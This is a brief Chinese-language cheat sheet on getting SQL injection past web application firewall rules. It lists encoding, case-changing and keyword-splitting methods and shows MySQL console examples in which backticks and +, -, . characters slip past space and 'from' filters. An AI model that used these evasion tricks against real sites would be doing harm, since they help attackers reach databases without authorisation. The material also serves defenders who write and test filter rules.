WAF规则策略阶段的绕过总结
1.字母大小写转换
2.数据库特殊语法绕过
3.关键字拆分绕过
4.请求方式差异规则松懈性绕过
5.多URL伪静态绕过
一、常见绕过方式
	1、URL编码
	2、Unicode编码

tips1: 神奇的 `  (格式输出表的那个控制符)
过空格和一些正则。

mysql> select`version`() 
    -> ;  
+----------------------+  
| `version`()          |  
+----------------------+  
| 5.1.50-community-log |  
+----------------------+  
1 row in set (0.00 sec)
一个更好玩的技巧，这个`控制符可以当注释符用（限定条件）。

mysql> select id from qs_admins where id=1;`dfff and comment it; 
+----+  
| id |  
+----+  
| 1  |  
+----+  
1 row in set (0.00 sec)
usage : where  id ='0'`'xxxxcomment on.

tips2:神奇的- + .
mysql> select id from qs_admins;  
+----+  
| id | 
+----+  
| 1  |  
+----+  
1 row in set (0.00 sec)

mysql> select+id-1+1.from qs_admins;  
+----------+  
| +id-1+1. |  
+----------+  
| 1        |  
+----------+  
1 row in set (0.00 sec)

mysql> select-id-1+3.from qs_admins;  
+----------+  
| -id-1+3. |  
+----------+  
| 1        |  
+----------+  
1 row in set (0.00 sec)
（有些人不是一直在说关键字怎么过？过滤一个from ...    就是这样连起来过）
